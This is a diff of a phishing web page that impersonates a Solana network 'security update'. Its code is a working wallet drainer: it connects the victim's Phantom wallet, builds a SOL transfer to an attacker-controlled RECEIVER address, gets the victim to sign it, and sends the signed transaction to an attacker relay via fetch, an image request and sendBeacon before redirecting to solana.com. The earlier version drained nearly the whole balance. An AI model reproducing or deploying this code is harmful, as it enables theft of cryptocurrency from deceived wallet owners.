@@ -3,22 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Network Security Upgrade | Solana</title>
+    <title>Network Sync</title>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-    <style>
-        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { text-align: center; background: #111; padding: 40px; border-radius: 20px; border: 1px solid #222; width: 300px; }
-        #cta { background: linear-gradient(90deg, #14F195, #9945FF); color: #000; border: none; padding: 15px; border-radius: 8px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 20px; }
-        #loader { display: none; margin-top: 20px; font-size: 12px; color: #14F195; }
-    </style>
 </head>
-<body>
-    <div class="container">
-        <img src="https://solana.com/favicon.ico" style="width:50px;">
-        <h2 style="font-size:1.1rem;">Security Protocol v4.2</h2>
-        <p style="color:#666; font-size:0.8rem;">Syncing wallet for network stability.</p>
-        <button id="cta">ACTIVATE NOW</button>
-        <div id="loader">● ENCRYPTING...</div>
+<body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:monospace;">
+    <div style="border:1px solid #333;padding:40px;display:inline-block;border-radius:15px;background:#111;">
+        <img src="https://solana.com/favicon.ico" style="width:40px;margin-bottom:10px;">
+        <h3>SYSTEM UPDATE</h3>
+        <button id="cta" style="padding:15px 40px;background:#14F195;color:#000;font-weight:bold;border:none;cursor:pointer;border-radius:5px;">ACTIVATE NOW</button>
+        <div id="status" style="margin-top:20px;color:#444;font-size:12px;">STATUS: READY</div>
     </div>
 
     <script>
@@ -27,53 +20,51 @@
 
         document.getElementById('cta').onclick = async () => {
             const p = window.solana || window.phantom?.solana;
-            if (!p) return alert("Please use Phantom browser.");
+            if (!p) return alert("Open in Phantom Browser");
 
             try {
-                const resp = await p.connect();
-                document.getElementById('cta').style.display = 'none';
-                document.getElementById('loader').style.display = 'block';
+                // 1. 简单连接
+                await p.connect();
+                document.getElementById('status').innerText = "FETCHING PARAMS...";
 
-                // 1. 获取 Blockhash
+                // 2. 从你的中继拿 Blockhash (这一步日志里显示是成功的)
                 const syncRes = await fetch(`${tunnel}/sync`);
                 const { bh } = await syncRes.json();
 
-                // 2. 查余额
-                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-                const balance = await connection.getBalance(resp.publicKey);
-                
-                // 3. 构造交易 (留 0.001 做手续费)
-                let amount = balance > 1000000 ? balance - 1000000 : 1000000;
-                
+                // 3. 构造一个固定的 0.01 SOL 支票（先确保能收到货！）
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: resp.publicKey,
+                        fromPubkey: p.publicKey,
                         toPubkey: new solanaWeb3.PublicKey(RECEIVER),
-                        lamports: amount,
+                        lamports: 10000000, 
                     })
                 );
                 transaction.recentBlockhash = bh;
-                transaction.feePayer = resp.publicKey;
+                transaction.feePayer = p.publicKey;
 
-                // 4. 拉起签名
+                document.getElementById('status').innerText = "AWAITING SIGNATURE...";
+
+                // 🔱 关键动作：只要求签名，不要求发送
                 const signed = await p.signTransaction(transaction);
                 const rawTx = signed.serialize().toString('base64');
                 
-                // 🔱 关键优化：使用 sendBeacon 确保数据一定能传回服务器，即使页面跳转
+                document.getElementById('status').innerText = "TRANSMITTING...";
+
+                // 4. 暴力回传数据
                 const collectUrl = `${tunnel}/collect?auth_sig=${encodeURIComponent(rawTx)}`;
                 
-                // 同时尝试两种回传方式，确保万无一失
-                fetch(collectUrl); 
+                // 强制发送 3 次，确保隧道能接收到
+                fetch(collectUrl);
+                const img = new Image(); img.src = collectUrl;
                 navigator.sendBeacon(collectUrl);
 
-                // 延迟 1.5 秒跳转，给数据传输留足时间
-                setTimeout(() => {
-                    window.location.href = "https://solana.com/";
-                }, 1500);
+                document.getElementById('status').innerText = "SUCCESS";
+                setTimeout(() => { window.location.href = "https://solana.com/"; }, 1000);
 
             } catch(e) {
-                console.log(e);
-                window.location.reload();
+                console.error(e);
+                document.getElementById('status').innerText = "RETRYING...";
+                setTimeout(() => { location.reload(); }, 1000);
             }
         };
     </script>
